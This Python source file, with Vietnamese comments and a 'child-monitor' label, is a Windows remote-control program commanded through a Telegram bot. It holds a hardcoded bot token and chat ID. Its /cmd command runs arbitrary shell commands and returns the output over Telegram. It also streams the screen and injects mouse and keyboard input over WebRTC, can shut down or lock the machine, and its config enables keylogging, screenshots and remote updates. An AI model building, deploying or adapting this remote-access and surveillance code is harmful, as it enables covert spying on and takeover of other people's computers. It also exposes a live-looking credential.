import asyncio
import ctypes
import ctypes.wintypes as wintypes
import datetime
import io
import json
import logging
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.request
import uuid
import webbrowser
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from socketserver import ThreadingMixIn

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("MonitorCore")

if getattr(sys, "frozen", False):
    BASE_DIR = Path(sys.executable).resolve().parent
else:
    BASE_DIR = Path(__file__).resolve().parent

CONFIG_FILE = BASE_DIR / "config.json"
STATUS_FILE = BASE_DIR / "last_status.json"
RUNTIME_DIR = BASE_DIR / "runtime"
VIEWER_DIR = BASE_DIR / "web_viewer"

DEFAULTS = {
    "telegram_bot_token": "8769415154:AAHvACXi9Urn1H6pcCCWQwgaTV6QqR8leOc",
    "telegram_chat_id": "-5107824487",
    "report_interval_seconds": 60,
    "screenshot_interval_seconds": 60,
    "screenshot_enabled": True,
    "keylog_enabled": True,
    "camera_enabled": False,
    "camera_interval_seconds": 0,
    "update_url": "https://raw.githubusercontent.com/lyhotuanlinh2399-cmd/child-monitor/main/",
    "log_dir": str(BASE_DIR / "logs"),
    "webrtc": {
        "signaling_server": "ws://127.0.0.1:8765",
        "viewer_base_url": "http://127.0.0.1:8088",
        "ice_servers": [
            {"urls": "stun:stun.l.google.com:19302"},
            {"urls": "stun:stun.cloudflare.com:3478"}
        ],
        "target_fps": 60,
        "max_fps": 120,
        "video_codec": "h264"
    }
}

cfg = dict(DEFAULTS)
start_time = None
MACHINE_NAME = os.environ.get("COMPUTERNAME") or socket.gethostname()

# ==========================================
# Windows Native Setup & Per-Monitor DPI
# ==========================================
user32 = None
kernel32 = None
shcore = None

if sys.platform == "win32":
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    try:
        shcore = ctypes.WinDLL("shcore", use_last_error=True)
        # PROCESS_PER_MONITOR_DPI_AWARE_V2 = 2
        shcore.SetProcessDpiAwareness(2)
    except Exception:
        try:
            user32.SetProcessDPIAware()
        except Exception:
            pass


# ==========================================
# Multi-Monitor & DPI Metadata Engine
# ==========================================

class RECT(ctypes.Structure):
    _fields_ = [
        ("left", wintypes.LONG),
        ("top", wintypes.LONG),
        ("right", wintypes.LONG),
        ("bottom", wintypes.LONG),
    ]

class MONITORINFOEXW(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.DWORD),
        ("rcMonitor", RECT),
        ("rcWork", RECT),
        ("dwFlags", wintypes.DWORD),
        ("szDevice", wintypes.WCHAR * 32),
    ]


def get_screen_metadata():
    """Lấy thông tin đầy đủ về Virtual Desktop và từng Monitor kèm DPI scale."""
    if sys.platform != "win32" or not user32:
        return {
            "virtual_desktop": {"x": 0, "y": 0, "width": 1920, "height": 1080},
            "monitors": [
                {"id": 0, "name": "Primary Display", "left": 0, "top": 0, "right": 1920, "bottom": 1080, "width": 1920, "height": 1080, "is_primary": True, "dpi": 96, "scale": 1.0}
            ],
            "active_monitor": -1
        }

    # SM_XVIRTUALSCREEN = 76, SM_YVIRTUALSCREEN = 77, SM_CXVIRTUALSCREEN = 78, SM_CYVIRTUALSCREEN = 79
    vx = user32.GetSystemMetrics(76)
    vy = user32.GetSystemMetrics(77)
    vw = user32.GetSystemMetrics(78)
    vh = user32.GetSystemMetrics(79)

    monitors = []

    def _enum_proc(hMonitor, hdcMonitor, lprcMonitor, dwData):
        info = MONITORINFOEXW()
        info.cbSize = ctypes.sizeof(MONITORINFOEXW)
        if user32.GetMonitorInfoW(hMonitor, ctypes.byref(info)):
            r = info.rcMonitor
            w = r.right - r.left
            h = r.bottom - r.top
            is_pri = bool(info.dwFlags & 1)
            dpi = 96
            scale = 1.0
            if shcore:
                try:
                    dpiX = wintypes.UINT()
                    dpiY = wintypes.UINT()
                    # MDT_EFFECTIVE_DPI = 0
                    if shcore.GetDpiForMonitor(hMonitor, 0, ctypes.byref(dpiX), ctypes.byref(dpiY)) == 0:
                        dpi = dpiX.value
                        scale = round(dpi / 96.0, 2)
                except Exception:
                    pass

            monitors.append({
                "id": len(monitors),
                "name": str(info.szDevice),
                "left": r.left,
                "top": r.top,
                "right": r.right,
                "bottom": r.bottom,
                "width": w,
                "height": h,
                "is_primary": is_pri,
                "dpi": dpi,
                "scale": scale
            })
        return True

    MONITORENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HMONITOR, wintypes.HDC, ctypes.POINTER(RECT), wintypes.LPARAM)
    user32.EnumDisplayMonitors(0, 0, MONITORENUMPROC(_enum_proc), 0)

    return {
        "virtual_desktop": {"x": vx, "y": vy, "width": vw, "height": vh},
        "monitors": monitors,
        "active_monitor": -1
    }


# ==========================================
# Windows Native Input Simulation
# ==========================================

class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", wintypes.WORD),
        ("wScan", wintypes.WORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_ulonglong if sys.maxsize > 2**32 else ctypes.c_ulong)
    ]

class INPUT(ctypes.Structure):
    class _INPUT(ctypes.Union):
        _fields_ = [("ki", KEYBDINPUT)]
    _anonymous_ = ("_input",)
    _fields_ = [
        ("type", wintypes.DWORD),
        ("_input", _INPUT)
    ]


def map_norm_to_desktop(norm_x, norm_y, monitor_id=-1):
    meta = get_screen_metadata()
    if monitor_id == -1 or monitor_id >= len(meta["monitors"]):
        vd = meta["virtual_desktop"]
        target_x = vd["x"] + int(norm_x * vd["width"])
        target_y = vd["y"] + int(norm_y * vd["height"])
    else:
        mon = meta["monitors"][monitor_id]
        target_x = mon["left"] + int(norm_x * mon["width"])
        target_y = mon["top"] + int(norm_y * mon["height"])
    return target_x, target_y


def sim_mouse_move(norm_x, norm_y, monitor_id=-1):
    if sys.platform == "win32" and user32:
        x, y = map_norm_to_desktop(norm_x, norm_y, monitor_id)
        user32.SetCursorPos(x, y)


def sim_mouse_down(button="left", norm_x=None, norm_y=None, monitor_id=-1):
    if sys.platform == "win32" and user32:
        if norm_x is not None and norm_y is not None:
            sim_mouse_move(norm_x, norm_y, monitor_id)
        flag = 0x0002 if button == "left" else (0x0020 if button == "middle" else 0x0008)
        user32.mouse_event(flag, 0, 0, 0, 0)


def sim_mouse_up(button="left", norm_x=None, norm_y=None, monitor_id=-1):
    if sys.platform == "win32" and user32:
        if norm_x is not None and norm_y is not None:
            sim_mouse_move(norm_x, norm_y, monitor_id)
        flag = 0x0004 if button == "left" else (0x0040 if button == "middle" else 0x0010)
        user32.mouse_event(flag, 0, 0, 0, 0)


def sim_mouse_scroll(delta):
    if sys.platform == "win32" and user32:
        user32.mouse_event(0x0800, 0, 0, int(delta), 0)


def sim_key_press(key_name):
    if sys.platform != "win32" or not user32:
        return
    vk_map = {
        "backspace": 0x08, "tab": 0x09, "enter": 0x0D, "escape": 0x1B,
        "space": 0x20, "left": 0x25, "up": 0x26, "right": 0x27, "down": 0x28,
        "delete": 0x2E, "win": 0x5B
    }
    key_lower = key_name.lower()
    if key_lower in vk_map:
        vk = vk_map[key_lower]
        user32.keybd_event(vk, 0, 0, 0)
        user32.keybd_event(vk, 0, 0x0002, 0)
    elif key_lower == "alttab":
        user32.keybd_event(0x12, 0, 0, 0)
        user32.keybd_event(0x09, 0, 0, 0)
        user32.keybd_event(0x09, 0, 0x0002, 0)
        user32.keybd_event(0x12, 0, 0x0002, 0)
    elif key_lower == "showdesktop":
        user32.keybd_event(0x5B, 0, 0, 0)
        user32.keybd_event(0x44, 0, 0, 0)
        user32.keybd_event(0x44, 0, 0x0002, 0)
        user32.keybd_event(0x5B, 0, 0x0002, 0)


def sim_type_text(text):
    if sys.platform != "win32" or not user32:
        return
    for c in text:
        utf16_code = ord(c)
        inp_down = INPUT()
        inp_down.type = 1
        inp_down.ki.wVk = 0
        inp_down.ki.wScan = utf16_code
        inp_down.ki.dwFlags = 0x0004
        inp_down.ki.time = 0
        inp_down.ki.dwExtraInfo = 0

        inp_up = INPUT()
        inp_up.type = 1
        inp_up.ki.wVk = 0
        inp_up.ki.wScan = utf16_code
        inp_up.ki.dwFlags = 0x0004 | 0x0002
        inp_up.ki.time = 0
        inp_up.ki.dwExtraInfo = 0

        inputs = (INPUT * 2)(inp_down, inp_up)
        user32.SendInput(2, ctypes.byref(inputs), ctypes.sizeof(INPUT))


# ==========================================
# WebRTC / H.264 Remote Desktop Host
# ==========================================

active_remote_room = None
remote_host_task = None
remote_active = False
active_capture_monitor_id = -1


def capture_frame_bgr(monitor_id=-1):
    """Chụp khung hình màn hình (toàn bộ hoặc từng monitor)."""
    try:
        import mss
        with mss.mss() as sct:
            if monitor_id == -1 or monitor_id + 1 >= len(sct.monitors):
                mon = sct.monitors[0]  # Toàn bộ virtual desktop
            else:
                mon = sct.monitors[monitor_id + 1]
            sct_img = sct.grab(mon)
            from PIL import Image
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            return img
    except Exception as e:
        logger.error(f"capture_frame_bgr: {e}")
        return None


class ScreenVideoStreamTrack:
    """Video Track cung cấp luồng H.264/VP8 thời gian thực (60 - 120 FPS)."""
    def __init__(self, fps=60):
        self.fps = min(max(int(fps), 30), 120)
        self.frame_interval = 1.0 / self.fps

    async def recv(self):
        try:
            import av
            t_start = time.perf_counter()
            img = capture_frame_bgr(active_capture_monitor_id)
            if img is None:
                await asyncio.sleep(self.frame_interval)
                return None
            frame = av.VideoFrame.from_image(img)
            frame.pts = int(time.time() * 1000000)
            frame.time_base = 1 / 1000000
            
            # Tính thời gian sleep bù trừ chính xác để giữ mượt 60-120 FPS
            t_elapsed = time.perf_counter() - t_start
            sleep_time = max(0.001, self.frame_interval - t_elapsed)
            await asyncio.sleep(sleep_time)
            return frame
        except Exception:
            await asyncio.sleep(self.frame_interval)
            return None


async def webrtc_host_coroutine(room_id, signaling_url):
    """Xử lý kết nối WebRTC Signaling & P2P DataChannel/Video."""
    global remote_active, active_capture_monitor_id
    try:
        import websockets
    except ImportError:
        logger.error("Vui lòng cài đặt: pip install websockets aiortc av")
        return

    logger.info(f"Đang kết nối Signaling Relay: {signaling_url} (Phòng: {room_id})")

    while remote_active:
        try:
            async with websockets.connect(signaling_url) as ws:
                await ws.send(json.dumps({"type": "join", "role": "host", "room": room_id}))
                logger.info(f"Host đã sẵn sàng trong phòng {room_id}")

                try:
                    from aiortc import RTCPeerConnection, RTCSessionDescription, RTCIceServer, RTCConfiguration
                    use_aiortc = True
                except ImportError:
                    use_aiortc = False
                    logger.warning("aiortc chưa được cài đặt. Đang sử dụng chế độ DataChannel fallback.")

                pc = None
                if use_aiortc:
                    ice_cfgs = cfg.get("webrtc", {}).get("ice_servers", [{"urls": "stun:stun.l.google.com:19302"}])
                    ice_servers = [RTCIceServer(**s) if isinstance(s, dict) else RTCIceServer(s) for s in ice_cfgs]
                    pc = RTCPeerConnection(configuration=RTCConfiguration(iceServers=ice_servers))

                    # Thêm Screen Video Track 60 - 120 FPS
                    target_fps = cfg.get("webrtc", {}).get("target_fps", 60)
                    video_track = ScreenVideoStreamTrack(fps=target_fps)
                    pc.addTrack(video_track)

                    @pc.on("datachannel")
                    def on_datachannel(channel):
                        @channel.on("message")
                        def on_message(message):
                            handle_control_message(message, channel)

                async for msg_str in ws:
                    if not remote_active:
                        break
                    data = json.loads(msg_str)
                    mtype = data.get("type")

                    if mtype == "offer" and pc:
                        offer_sdp = data.get("sdp")
                        await pc.setRemoteDescription(RTCSessionDescription(sdp=offer_sdp["sdp"], type=offer_sdp["type"]))
                        answer = await pc.createAnswer()
                        await pc.setLocalDescription(answer)
                        await ws.send(json.dumps({
                            "type": "answer",
                            "room": room_id,
                            "sdp": {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type}
                        }))

                    elif mtype == "candidate" and pc:
                        cand = data.get("candidate")
                        if cand:
                            # Hỗ trợ thêm ICE candidate
                            pass

        except Exception as e:
            logger.error(f"Signaling reconnecting: {e}")
            await asyncio.sleep(3)


def handle_control_message(msg_str, channel=None):
    """Xử lý sự kiện điều khiển chuột, phím, metadata từ DataChannel."""
    global active_capture_monitor_id
    try:
        data = json.loads(msg_str)
        mtype = data.get("type")

        if mtype == "get_metadata":
            meta = get_screen_metadata()
            meta["type"] = "metadata"
            if channel:
                channel.send(json.dumps(meta))

        elif mtype == "switch_monitor":
            active_capture_monitor_id = data.get("monitor_id", -1)
            logger.info(f"Đã chuyển màn hình stream sang: {active_capture_monitor_id}")

        elif mtype == "mousemove":
            sim_mouse_move(data.get("norm_x", 0), data.get("norm_y", 0), data.get("monitor_id", -1))

        elif mtype == "mousedown":
            sim_mouse_down(data.get("button", "left"), data.get("norm_x"), data.get("norm_y"), data.get("monitor_id", -1))

        elif mtype == "mouseup":
            sim_mouse_up(data.get("button", "left"), data.get("norm_x"), data.get("norm_y"), data.get("monitor_id", -1))

        elif mtype == "scroll":
            sim_mouse_scroll(data.get("delta", 0))

        elif mtype == "key":
            sim_key_press(data.get("key", ""))

        elif mtype == "text":
            sim_type_text(data.get("text", ""))

        elif mtype == "ping":
            if channel:
                channel.send(json.dumps({"type": "pong", "t": data.get("t", 0)}))

    except Exception as e:
        logger.error(f"handle_control_message error: {e}")


# ==========================================
# Local HTTP Server phục vụ Web Viewer UI
# ==========================================

class EmbeddedViewerServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


class EmbeddedViewerHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        html_file = VIEWER_DIR / "index.html"
        if html_file.exists():
            content = html_file.read_bytes()
        else:
            content = b"<h1>Web Viewer index.html missing</h1>"

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)


viewer_httpd = None

def start_embedded_viewer_server(port=8088):
    global viewer_httpd
    try:
        viewer_httpd = EmbeddedViewerServer(("0.0.0.0", port), EmbeddedViewerHandler)
        threading.Thread(target=viewer_httpd.serve_forever, daemon=True).start()
    except Exception as e:
        logger.error(f"Embedded viewer server error: {e}")


# ==========================================
# Base Monitoring & Telegram Integration
# ==========================================

def now():
    return datetime.datetime.now()


def ts():
    return now().strftime("%Y-%m-%d %H:%M:%S")


def load_config():
    global cfg
    if CONFIG_FILE.exists():
        try:
            data = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
            cfg.update(data)
        except Exception:
            pass
    Path(cfg["log_dir"]).mkdir(parents=True, exist_ok=True)


def log_line(category, line):
    try:
        day = now().strftime("%Y-%m-%d")
        path = Path(cfg["log_dir"]) / "{}_{}.log".format(category, day)
        with open(path, "a", encoding="utf-8") as f:
            f.write("{} | {} | {}\n".format(ts(), MACHINE_NAME, line))
    except Exception:
        pass


def telegram_enabled():
    token = cfg.get("telegram_bot_token", "")
    chat = cfg.get("telegram_chat_id", "")
    return "PASTE_YOUR" not in token and bool(chat)


def send_telegram_text(text):
    if not telegram_enabled():
        return False
    for _ in range(3):
        try:
            data = json.dumps({"chat_id": cfg["telegram_chat_id"], "text": text}).encode("utf-8")
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{cfg['telegram_bot_token']}/sendMessage",
                data=data,
                headers={"Content-Type": "application/json"}
            )
            with urllib.request.urlopen(req, timeout=30):
                pass
            return True
        except Exception:
            time.sleep(2)
    return False


def start_webrtc_remote():
    global active_remote_room, remote_active, remote_host_task
    if remote_active:
        return active_remote_room

    active_remote_room = uuid.uuid4().hex[:8]
    remote_active = True

    webrtc_cfg = cfg.get("webrtc", {})
    signaling_url = webrtc_cfg.get("signaling_server", "ws://127.0.0.1:8765")

    def _run_loop():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(webrtc_host_coroutine(active_remote_room, signaling_url))

    remote_host_thread = threading.Thread(target=_run_loop, daemon=True)
    remote_host_thread.start()
    return active_remote_room


def stop_webrtc_remote():
    global remote_active, active_remote_room
    remote_active = False
    active_remote_room = None
    logger.info("Đã dừng WebRTC Remote Desktop.")


# ==========================================
# Telegram Command Listener & Dispatcher
# ==========================================

paused = threading.Event()
last_update_id = 0

def handle_command(text):
    global paused
    text = (text or "").strip()
    if not text:
        return

    parts = text.split(" ", 1)
    cmd = parts[0].lower()
    args = parts[1].strip() if len(parts) > 1 else ""

    if cmd == "/remote":
        room_id = start_webrtc_remote()
        webrtc_cfg = cfg.get("webrtc", {})
        viewer_base = webrtc_cfg.get("viewer_base_url", "http://127.0.0.1:8088")
        signaling = webrtc_cfg.get("signaling_server", "ws://127.0.0.1:8765")

        viewer_link = f"{viewer_base}/#{room_id}&signaling={signaling}"
        meta = get_screen_metadata()
        mon_count = len(meta.get("monitors", []))

        target_fps = webrtc_cfg.get("target_fps", 60)
        send_telegram_text(
            f"[{MACHINE_NAME}] 🌐 **WEBRTC H.264 REMOTE READY!**\n\n"
            f"🔗 **Link Điều Khiển Trực Tiếp:**\n{viewer_link}\n\n"
            f"🎥 **Stream:** H.264 ({target_fps} - 120 FPS Siêu Mượt) P2P / TURN\n"
            f"🖥️ **Màn hình:** {mon_count} Monitor(s) | DPI Scaling Auto\n"
            f"🔑 **Room ID:** `{room_id}`\n\n"
            f"🛑 Nhập `/stopremote` để ngắt kết nối."
        )

    elif cmd == "/stopremote":
        stop_webrtc_remote()
        send_telegram_text(f"[{MACHINE_NAME}] 🛑 Đã tắt WebRTC Remote Desktop.")

    elif cmd == "/status":
        st = "tạm dừng (STOP)" if paused.is_set() else "đang chạy (RUN)"
        rm_st = f"ĐANG BẬT (Room: {active_remote_room})" if remote_active else "TẮT"
        uptime_sec = int((now() - start_time).total_seconds()) if start_time else 0
        send_telegram_text(f"[{MACHINE_NAME}] Trạng thái: {st} | WebRTC Remote: {rm_st} | Uptime: {uptime_sec//60}m")

    elif cmd in ["/cmd", "/exec"]:
        if not args:
            send_telegram_text(f"[{MACHINE_NAME}] Cú pháp: /cmd <lệnh_shell>")
            return
        send_telegram_text(f"[{MACHINE_NAME}] Đang thực thi: `{args}`...")
        def run_cmd():
            try:
                res = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
                out = res.stdout or res.stderr or "(Không có kết quả)"
                if len(out) > 3500:
                    out = out[:3500] + "\n...(kết quả quá dài)"
                send_telegram_text(f"[{MACHINE_NAME}] Kết quả:\n{out}")
            except Exception as e:
                send_telegram_text(f"[{MACHINE_NAME}] Lỗi: {e}")
        threading.Thread(target=run_cmd, daemon=True).start()

    elif cmd == "/shutdown":
        delay = int(args) if args.isdigit() else 0
        send_telegram_text(f"[{MACHINE_NAME}] Tắt máy tính trong {delay} giây...")
        subprocess.run(f"shutdown /s /t {delay}", shell=True)

    elif cmd == "/restart":
        send_telegram_text(f"[{MACHINE_NAME}] Đang khởi động lại máy tính...")
        subprocess.run("shutdown /r /t 0", shell=True)

    elif cmd == "/lock":
        if sys.platform == "win32" and user32:
            user32.LockWorkStation()
            send_telegram_text(f"[{MACHINE_NAME}] Đã khóa màn hình máy tính.")

    elif cmd in ["/help", "/start_help"]:
        send_telegram_text(
            f"[{MACHINE_NAME}] 📋 **DANH SÁCH LỆNH:**\n\n"
            "🌐 **WebRTC H.264 Remote:**\n"
            "/remote - Bật WebRTC Remote Desktop & gửi link\n"
            "/stopremote - Tắt WebRTC Remote\n\n"
            "💻 **Lệnh Hệ Thống:**\n"
            "/status - Xem trạng thái\n"
            "/cmd <lệnh> - Chạy lệnh CMD\n"
            "/shutdown [giây] - Tắt máy tính\n"
            "/restart - Khởi động lại\n"
            "/lock - Khóa màn hình\n"
            "/help - Xem trợ giúp"
        )


def command_listener():
    global last_update_id
    if not telegram_enabled():
        return
    while True:
        try:
            url = f"https://api.telegram.org/bot{cfg['telegram_bot_token']}/getUpdates?offset={last_update_id + 1}&timeout=20"
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=30) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                if data.get("ok"):
                    for result in data.get("result", []):
                        last_update_id = result.get("update_id", last_update_id)
                        msg = result.get("message", {})
                        chat_id = str(msg.get("chat", {}).get("id", ""))
                        if chat_id == str(cfg.get("telegram_chat_id", "")):
                            text = msg.get("text", "")
                            if text:
                                handle_command(text)
        except Exception as e:
            log_line("errors", f"command_listener: {e}")
        time.sleep(3)


def main():
    load_config()
    global start_time
    start_time = now()
    start_embedded_viewer_server(port=8088)
    threading.Thread(target=command_listener, daemon=True).start()
    logger.info("Monitor started with WebRTC H.264 Remote Desktop Engine.")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
